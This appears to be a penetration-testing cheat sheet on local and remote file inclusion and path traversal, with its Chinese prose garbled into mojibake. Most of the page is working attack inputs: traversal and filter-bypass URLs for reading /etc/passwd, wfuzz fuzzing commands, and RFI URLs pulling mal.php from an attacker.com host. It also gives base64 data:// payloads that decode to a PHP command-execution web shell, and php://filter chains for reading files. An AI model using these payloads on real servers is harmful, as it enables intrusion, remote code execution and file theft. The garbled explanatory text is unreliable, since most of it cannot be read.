# æ–‡ä»¶åŒ…å«/è·¯å¾„éå†

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°

**ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼

## æ–‡ä»¶åŒ…å«

**è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI)ï¼š** æ–‡ä»¶ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½ï¼ˆæœ€ä½³ï¼šæ‚¨å¯ä»¥ç¼–å†™ä»£ç ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œå®ƒï¼‰ã€‚åœ¨ php ä¸­ï¼Œè¿™ä¸ªåŠŸèƒ½é»˜è®¤æ˜¯ **ç¦ç”¨** çš„ (**allow\_url\_include**)ã€‚\
**æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)ï¼š** æœåŠ¡å™¨åŠ è½½æœ¬åœ°æ–‡ä»¶ã€‚

å½“ç”¨æˆ·ä»¥æŸç§æ–¹å¼æ§åˆ¶å°†è¢«æœåŠ¡å™¨åŠ è½½çš„æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤æ¼æ´ã€‚

æ˜“å—æ”»å‡»çš„ **PHP å‡½æ•°**ï¼šrequire, require\_once, include, include\_once

ä¸€ä¸ªæœ‰è¶£çš„å·¥å…·æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼š[https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE æ–‡ä»¶
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**æ··åˆå¤šä¸ª \*nix LFI åˆ—è¡¨å¹¶æ·»åŠ æ›´å¤šè·¯å¾„ï¼Œæˆ‘åˆ›å»ºäº†è¿™ä¸ªï¼š**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

å°è¯•å°† `/` æ”¹ä¸º `\`\
å°è¯•æ·»åŠ  `../../../../../`

ä¸€ä¸ªä½¿ç”¨å¤šç§æŠ€æœ¯æŸ¥æ‰¾æ–‡ä»¶ /etc/passwordï¼ˆä»¥æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼‰çš„åˆ—è¡¨å¯ä»¥åœ¨ [è¿™é‡Œ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) æ‰¾åˆ°ã€‚

### **Windows**

ä¸åŒè¯è¡¨çš„åˆå¹¶ï¼š

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

å°è¯•å°† `/` æ”¹ä¸º `\`\
å°è¯•åˆ é™¤ `C:/` å¹¶æ·»åŠ  `../../../../../`

ä¸€ä¸ªä½¿ç”¨å¤šç§æŠ€æœ¯æŸ¥æ‰¾æ–‡ä»¶ /boot.iniï¼ˆä»¥æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼‰çš„åˆ—è¡¨å¯ä»¥åœ¨ [è¿™é‡Œ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) æ‰¾åˆ°ã€‚

### **OS X**

æ£€æŸ¥ Linux çš„ LFI åˆ—è¡¨ã€‚

## åŸºæœ¬ LFI å’Œç»•è¿‡

æ‰€æœ‰ç¤ºä¾‹éƒ½æ˜¯é’ˆå¯¹æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½†ä¹Ÿå¯ä»¥åº”ç”¨äºè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆé¡µé¢=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/ï¼‰ã€‚
```
http://example.com/index.php?page=../../../etc/passwd
```
### éé€’å½’å‰¥ç¦»éå†åºåˆ—
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ç©ºå­—èŠ‚ (%00)**

ç»•è¿‡åœ¨æä¾›çš„å­—ç¬¦ä¸²æœ«å°¾é™„åŠ æ›´å¤šå­—ç¬¦çš„é™åˆ¶ï¼ˆç»•è¿‡ï¼š$\_GET\['param']."php"ï¼‰
```
http://example.com/index.php?page=../../../etc/passwd%00
```
è¿™æ˜¯**è‡ª PHP 5.4 èµ·å·²è§£å†³**

### **ç¼–ç **

æ‚¨å¯ä»¥ä½¿ç”¨éæ ‡å‡†ç¼–ç ï¼Œä¾‹å¦‚åŒé‡ URL ç¼–ç ï¼ˆå’Œå…¶ä»–ç¼–ç ï¼‰ï¼š
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### ä»ç°æœ‰æ–‡ä»¶å¤¹

ä¹Ÿè®¸åç«¯æ­£åœ¨æ£€æŸ¥æ–‡ä»¶å¤¹è·¯å¾„ï¼š
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### åœ¨æœåŠ¡å™¨ä¸Šæ¢ç´¢æ–‡ä»¶ç³»ç»Ÿç›®å½•

æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿå¯ä»¥é€šè¿‡æŸäº›æŠ€æœ¯é€’å½’åœ°æ¢ç´¢ï¼Œä»¥è¯†åˆ«ç›®å½•ï¼Œè€Œä¸ä»…ä»…æ˜¯æ–‡ä»¶ã€‚è¿™ä¸ªè¿‡ç¨‹æ¶‰åŠç¡®å®šç›®å½•æ·±åº¦å¹¶æ¢æµ‹ç‰¹å®šæ–‡ä»¶å¤¹çš„å­˜åœ¨ã€‚ä»¥ä¸‹æ˜¯å®ç°æ­¤ç›®çš„çš„è¯¦ç»†æ–¹æ³•ï¼š

1. **ç¡®å®šç›®å½•æ·±åº¦ï¼š** é€šè¿‡æˆåŠŸè·å– `/etc/passwd` æ–‡ä»¶æ¥ç¡®å®šå½“å‰ç›®å½•çš„æ·±åº¦ï¼ˆé€‚ç”¨äºåŸºäºLinuxçš„æœåŠ¡å™¨ï¼‰ã€‚ä¸€ä¸ªç¤ºä¾‹URLå¯èƒ½ç»“æ„å¦‚ä¸‹ï¼Œè¡¨ç¤ºæ·±åº¦ä¸ºä¸‰ï¼š
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **æ¢æµ‹æ–‡ä»¶å¤¹ï¼š** å°†å¯ç–‘æ–‡ä»¶å¤¹çš„åç§°ï¼ˆä¾‹å¦‚ï¼Œ`private`ï¼‰é™„åŠ åˆ° URLï¼Œç„¶åå¯¼èˆªå› `/etc/passwd`ã€‚é¢å¤–çš„ç›®å½•çº§åˆ«éœ€è¦å°†æ·±åº¦å¢åŠ ä¸€ä¸ªï¼š
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **è§£é‡Šç»“æœï¼š** æœåŠ¡å™¨çš„å“åº”æŒ‡ç¤ºæ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼š
* **é”™è¯¯ / æ— è¾“å‡ºï¼š** æ–‡ä»¶å¤¹ `private` å¯èƒ½åœ¨æŒ‡å®šä½ç½®ä¸å­˜åœ¨ã€‚
* **`/etc/passwd` çš„å†…å®¹ï¼š** ç¡®è®¤å­˜åœ¨ `private` æ–‡ä»¶å¤¹ã€‚
4. **é€’å½’æ¢ç´¢ï¼š** å‘ç°çš„æ–‡ä»¶å¤¹å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯æˆ–ä¼ ç»Ÿçš„æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI) æ–¹æ³•è¿›ä¸€æ­¥æ¢æµ‹å­ç›®å½•æˆ–æ–‡ä»¶ã€‚

è¦æ¢ç´¢æ–‡ä»¶ç³»ç»Ÿä¸­ä¸åŒä½ç½®çš„ç›®å½•ï¼Œè¯·ç›¸åº”è°ƒæ•´æœ‰æ•ˆè½½è·ã€‚ä¾‹å¦‚ï¼Œè¦æ£€æŸ¥ `/var/www/` æ˜¯å¦åŒ…å« `private` ç›®å½•ï¼ˆå‡è®¾å½“å‰ç›®å½•æ·±åº¦ä¸º 3ï¼‰ï¼Œè¯·ä½¿ç”¨ï¼š
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **è·¯å¾„æˆªæ–­æŠ€æœ¯**

è·¯å¾„æˆªæ–­æ˜¯ä¸€ç§ç”¨äºæ“çºµWebåº”ç”¨ç¨‹åºä¸­æ–‡ä»¶è·¯å¾„çš„æ–¹æ³•ã€‚å®ƒé€šå¸¸ç”¨äºé€šè¿‡ç»•è¿‡æŸäº›å®‰å…¨æªæ–½æ¥è®¿é—®å—é™æ–‡ä»¶ï¼Œè¿™äº›å®‰å…¨æªæ–½ä¼šåœ¨æ–‡ä»¶è·¯å¾„çš„æœ«å°¾é™„åŠ é¢å¤–å­—ç¬¦ã€‚ç›®æ ‡æ˜¯æ„é€ ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œè¯¥è·¯å¾„åœ¨è¢«å®‰å…¨æªæ–½ä¿®æ”¹åï¼Œä»ç„¶æŒ‡å‘æ‰€éœ€çš„æ–‡ä»¶ã€‚

åœ¨PHPä¸­ï¼Œç”±äºæ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æ€§ï¼Œæ–‡ä»¶è·¯å¾„çš„å„ç§è¡¨ç¤ºå¯ä»¥è¢«è§†ä¸ºç­‰æ•ˆã€‚ä¾‹å¦‚ï¼š

* `/etc/passwd`ã€`/etc//passwd`ã€`/etc/./passwd`å’Œ`/etc/passwd/`éƒ½è¢«è§†ä¸ºç›¸åŒçš„è·¯å¾„ã€‚
* å½“æœ€å6ä¸ªå­—ç¬¦ä¸º`passwd`æ—¶ï¼Œé™„åŠ ä¸€ä¸ª`/`ï¼ˆä½¿å…¶å˜ä¸º`passwd/`ï¼‰ä¸ä¼šæ”¹å˜ç›®æ ‡æ–‡ä»¶ã€‚
* åŒæ ·ï¼Œå¦‚æœåœ¨æ–‡ä»¶è·¯å¾„åé™„åŠ `.php`ï¼ˆå¦‚`shellcode.php`ï¼‰ï¼Œåœ¨æœ«å°¾æ·»åŠ `/.`ä¸ä¼šæ”¹å˜è¢«è®¿é—®çš„æ–‡ä»¶ã€‚

æä¾›çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨è·¯å¾„æˆªæ–­è®¿é—®`/etc/passwd`ï¼Œè¿™æ˜¯ä¸€ä¸ªç”±äºå…¶æ•æ„Ÿå†…å®¹ï¼ˆç”¨æˆ·è´¦æˆ·ä¿¡æ¯ï¼‰è€Œå¸¸è§çš„ç›®æ ‡ï¼š
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæ‰€éœ€çš„éå†æ¬¡æ•°å¯èƒ½åœ¨2027å·¦å³ï¼Œä½†è¿™ä¸ªæ•°å­—å¯èƒ½ä¼šæ ¹æ®æœåŠ¡å™¨çš„é…ç½®è€Œæœ‰æ‰€ä¸åŒã€‚

* **ä½¿ç”¨ç‚¹æ®µå’Œé™„åŠ å­—ç¬¦**ï¼šéå†åºåˆ—ï¼ˆ`../`ï¼‰ä¸é¢å¤–çš„ç‚¹æ®µå’Œå­—ç¬¦ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥ç”¨æ¥å¯¼èˆªæ–‡ä»¶ç³»ç»Ÿï¼Œæœ‰æ•ˆåœ°å¿½ç•¥æœåŠ¡å™¨é™„åŠ çš„å­—ç¬¦ä¸²ã€‚
* **ç¡®å®šæ‰€éœ€çš„éå†æ¬¡æ•°**ï¼šé€šè¿‡åå¤è¯•éªŒï¼Œå¯ä»¥æ‰¾åˆ°ç²¾ç¡®çš„`../`åºåˆ—æ•°é‡ï¼Œä»¥å¯¼èˆªåˆ°æ ¹ç›®å½•ï¼Œç„¶ååˆ°`/etc/passwd`ï¼Œç¡®ä¿ä»»ä½•é™„åŠ çš„å­—ç¬¦ä¸²ï¼ˆå¦‚`.php`ï¼‰è¢«ä¸­å’Œï¼Œä½†æ‰€éœ€çš„è·¯å¾„ï¼ˆ`/etc/passwd`ï¼‰ä¿æŒä¸å˜ã€‚
* **ä»è™šå‡ç›®å½•å¼€å§‹**ï¼šé€šå¸¸çš„åšæ³•æ˜¯ä»¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼ˆå¦‚`a/`ï¼‰å¼€å§‹è·¯å¾„ã€‚è¿™ç§æŠ€æœ¯ä½œä¸ºé¢„é˜²æªæ–½æˆ–æ»¡è¶³æœåŠ¡å™¨è·¯å¾„è§£æé€»è¾‘çš„è¦æ±‚ã€‚

åœ¨ä½¿ç”¨è·¯å¾„æˆªæ–­æŠ€æœ¯æ—¶ï¼Œäº†è§£æœåŠ¡å™¨çš„è·¯å¾„è§£æè¡Œä¸ºå’Œæ–‡ä»¶ç³»ç»Ÿç»“æ„è‡³å…³é‡è¦ã€‚æ¯ç§åœºæ™¯å¯èƒ½éœ€è¦ä¸åŒçš„æ–¹æ³•ï¼Œé€šå¸¸éœ€è¦æµ‹è¯•ä»¥æ‰¾åˆ°æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚

**æ­¤æ¼æ´åœ¨PHP 5.3ä¸­å·²è¢«ä¿®å¤ã€‚**

### **è¿‡æ»¤å™¨ç»•è¿‡æŠ€å·§**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

åœ¨phpä¸­ï¼Œè¿™é»˜è®¤æ˜¯ç¦ç”¨çš„ï¼Œå› ä¸º **`allow_url_include`** æ˜¯ **å…³é—­** çš„ã€‚å®ƒå¿…é¡»æ˜¯ **å¼€å¯** çš„æ‰èƒ½å·¥ä½œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä»æ‚¨çš„æœåŠ¡å™¨åŒ…å«ä¸€ä¸ªPHPæ–‡ä»¶å¹¶è·å¾—RCEï¼š
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
å¦‚æœç”±äºæŸç§åŸå›  **`allow_url_include`** æ˜¯ **å¼€å¯** çš„ï¼Œä½† PHP æ­£åœ¨ **è¿‡æ»¤** å¯¹å¤–éƒ¨ç½‘é¡µçš„è®¿é—®ï¼Œ[æ ¹æ®è¿™ç¯‡æ–‡ç« ](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¾‹å¦‚æ•°æ®åè®®å’Œ base64 æ¥è§£ç  b64 PHP ä»£ç å¹¶è·å¾— RCEï¼š 

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
åœ¨å‰é¢çš„ä»£ç ä¸­ï¼Œæœ€åçš„ `+.txt` è¢«æ·»åŠ æ˜¯å› ä¸ºæ”»å‡»è€…éœ€è¦ä¸€ä¸ªä»¥ `.txt` ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å­—ç¬¦ä¸²ä»¥å®ƒç»“å°¾ï¼Œå¹¶ä¸”åœ¨ b64 è§£ç åé‚£éƒ¨åˆ†å°†è¿”å›åƒåœ¾æ•°æ®ï¼ŒçœŸæ­£çš„ PHP ä»£ç å°†è¢«åŒ…å«ï¼ˆå› æ­¤è¢«æ‰§è¡Œï¼‰ã€‚
{% endhint %}

å¦ä¸€ä¸ª**ä¸ä½¿ç”¨ `php://` åè®®**çš„ä¾‹å­æ˜¯ï¼š

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python æ ¹å…ƒç´ 

åœ¨ Python ä¸­ï¼Œåƒè¿™æ ·çš„ä»£ç ï¼š
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
å¦‚æœç”¨æˆ·ä¼ é€’ä¸€ä¸ª **ç»å¯¹è·¯å¾„** ç»™ **`file_name`**ï¼Œ**ä¹‹å‰çš„è·¯å¾„ä¼šè¢«ç§»é™¤**ï¼š
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
æ ¹æ®[æ–‡æ¡£](https://docs.python.org/3.10/library/os.path.html#os.path.join)ï¼Œè¿™æ˜¯é¢„æœŸçš„è¡Œä¸ºï¼š

> å¦‚æœä¸€ä¸ªç»„ä»¶æ˜¯ç»å¯¹è·¯å¾„ï¼Œåˆ™æ‰€æœ‰å…ˆå‰çš„ç»„ä»¶éƒ½ä¼šè¢«ä¸¢å¼ƒï¼Œå¹¶ä»ç»å¯¹è·¯å¾„ç»„ä»¶ç»§ç»­è¿æ¥ã€‚

## Java åˆ—å‡ºç›®å½•

çœ‹èµ·æ¥å¦‚æœä½ åœ¨ Java ä¸­æœ‰è·¯å¾„éå†å¹¶ä¸”ä½ **è¯·æ±‚ä¸€ä¸ªç›®å½•**è€Œä¸æ˜¯æ–‡ä»¶ï¼Œ**å°†è¿”å›è¯¥ç›®å½•çš„åˆ—è¡¨**ã€‚åœ¨å…¶ä»–è¯­è¨€ä¸­ï¼ˆæ®æˆ‘æ‰€çŸ¥ï¼‰ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚

## å‰25ä¸ªå‚æ•°

ä»¥ä¸‹æ˜¯å¯èƒ½å®¹æ˜“å—åˆ°æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´å½±å“çš„å‰25ä¸ªå‚æ•°åˆ—è¡¨ï¼ˆæ¥è‡ª[é“¾æ¥](https://twitter.com/trbughunters/status/1279768631845494787)ï¼‰ï¼š
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI ä½¿ç”¨ PHP åŒ…è£…å™¨å’Œåè®®

### php://filter

PHP è¿‡æ»¤å™¨å…è®¸åœ¨æ•°æ®è¢«è¯»å–æˆ–å†™å…¥ä¹‹å‰æ‰§è¡ŒåŸºæœ¬çš„ **ä¿®æ”¹æ“ä½œ**ã€‚è¿‡æ»¤å™¨åˆ†ä¸º 5 ç±»ï¼š

* [å­—ç¬¦ä¸²è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: ä»æ•°æ®ä¸­ç§»é™¤æ ‡ç­¾ï¼ˆåœ¨ "<" å’Œ ">" å­—ç¬¦ä¹‹é—´çš„æ‰€æœ‰å†…å®¹ï¼‰
* è¯·æ³¨æ„ï¼Œè¿™ä¸ªè¿‡æ»¤å™¨åœ¨ç°ä»£ç‰ˆæœ¬çš„ PHP ä¸­å·²ç»æ¶ˆå¤±
* [è½¬æ¢è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : è½¬æ¢ä¸ºä¸åŒçš„ç¼–ç (`convert.iconv.<input_enc>.<output_enc>`)ã€‚è¦è·å– **æ‰€æœ‰æ”¯æŒçš„ç¼–ç åˆ—è¡¨**ï¼Œè¯·åœ¨æ§åˆ¶å°è¿è¡Œï¼š`iconv -l`

{% hint style="warning" %}
æ»¥ç”¨ `convert.iconv.*` è½¬æ¢è¿‡æ»¤å™¨å¯ä»¥ **ç”Ÿæˆä»»æ„æ–‡æœ¬**ï¼Œè¿™å¯èƒ½å¯¹å†™å…¥ä»»æ„æ–‡æœ¬æˆ–ä½¿å‡½æ•°å¦‚åŒ…å«è¿‡ç¨‹å¤„ç†ä»»æ„æ–‡æœ¬æœ‰ç”¨ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [**é€šè¿‡ php è¿‡æ»¤å™¨çš„ LFI2RCE**](lfi2rce-via-php-filters.md)ã€‚
{% endhint %}

* [å‹ç¼©è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: å‹ç¼©å†…å®¹ï¼ˆå¦‚æœæå–å¤§é‡ä¿¡æ¯æ—¶å¾ˆæœ‰ç”¨ï¼‰
* `zlib.inflate`: è§£å‹æ•°æ®
* [åŠ å¯†è¿‡æ»¤å™¨](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : å·²å¼ƒç”¨
* `mdecrypt.*` : å·²å¼ƒç”¨
* å…¶ä»–è¿‡æ»¤å™¨
* åœ¨ php ä¸­è¿è¡Œ `var_dump(stream_get_filters());` å¯ä»¥æ‰¾åˆ°å‡ ä¸ª **æ„å¤–çš„è¿‡æ»¤å™¨**ï¼š
* `consumed`
* `dechunk`: åè½¬ HTTP åˆ†å—ç¼–ç 
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
éƒ¨åˆ† "php://filter" ä¸åŒºåˆ†å¤§å°å†™
{% endhint %}

### ä½¿ç”¨ php è¿‡æ»¤å™¨ä½œä¸º oracle è¯»å–ä»»æ„æ–‡ä»¶

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) æå‡ºäº†ä¸€ç§åœ¨ä¸ä»æœåŠ¡å™¨è¿”å›è¾“å‡ºçš„æƒ…å†µä¸‹è¯»å–æœ¬åœ°æ–‡ä»¶çš„æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åŸºäº **ä½¿ç”¨ php è¿‡æ»¤å™¨ä½œä¸º oracle çš„æ–‡ä»¶å¸ƒå°”å¤–æ³„ï¼ˆé€å­—ç¬¦ï¼‰**ã€‚è¿™æ˜¯å› ä¸º php è¿‡æ»¤å™¨å¯ä»¥ç”¨æ¥ä½¿æ–‡æœ¬å˜å¾—è¶³å¤Ÿå¤§ï¼Œä»è€Œä½¿ php æŠ›å‡ºå¼‚å¸¸ã€‚

åœ¨åŸå§‹æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°è¯¥æŠ€æœ¯çš„è¯¦ç»†è§£é‡Šï¼Œä½†è¿™é‡Œæ˜¯ä¸€ä¸ªå¿«é€Ÿæ€»ç»“ï¼š

* ä½¿ç”¨ç¼–ç  **`UCS-4LE`** å°†æ–‡æœ¬çš„å‰å¯¼å­—ç¬¦ç•™åœ¨å¼€å¤´ï¼Œå¹¶ä½¿å­—ç¬¦ä¸²çš„å¤§å°å‘ˆæŒ‡æ•°çº§å¢é•¿ã€‚
* è¿™å°†ç”¨äºç”Ÿæˆä¸€ä¸ª **å½“åˆå§‹å­—æ¯æ­£ç¡®çŒœæµ‹æ—¶éå¸¸å¤§çš„æ–‡æœ¬**ï¼Œä»¥è‡³äº php ä¼šè§¦å‘ä¸€ä¸ª **é”™è¯¯**ã€‚
* **dechunk** è¿‡æ»¤å™¨å°† **åˆ é™¤æ‰€æœ‰å†…å®¹ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯åå…­è¿›åˆ¶**ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯åå…­è¿›åˆ¶ã€‚
* è¿™ä¸å‰ä¸€ä¸ªï¼ˆä»¥åŠå…¶ä»–æ ¹æ®çŒœæµ‹å­—æ¯çš„è¿‡æ»¤å™¨ï¼‰ç»“åˆï¼Œå°†å…è®¸æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ä½•æ—¶è¿›è¡Œè¶³å¤Ÿçš„è½¬æ¢ä½¿å…¶ä¸å†æ˜¯åå…­è¿›åˆ¶å­—ç¬¦æ¥çŒœæµ‹æ–‡æœ¬å¼€å¤´çš„å­—æ¯ã€‚å› ä¸ºå¦‚æœæ˜¯åå…­è¿›åˆ¶ï¼Œdechunk ä¸ä¼šåˆ é™¤å®ƒï¼Œåˆå§‹ç‚¸å¼¹å°†å¯¼è‡´ php é”™è¯¯ã€‚
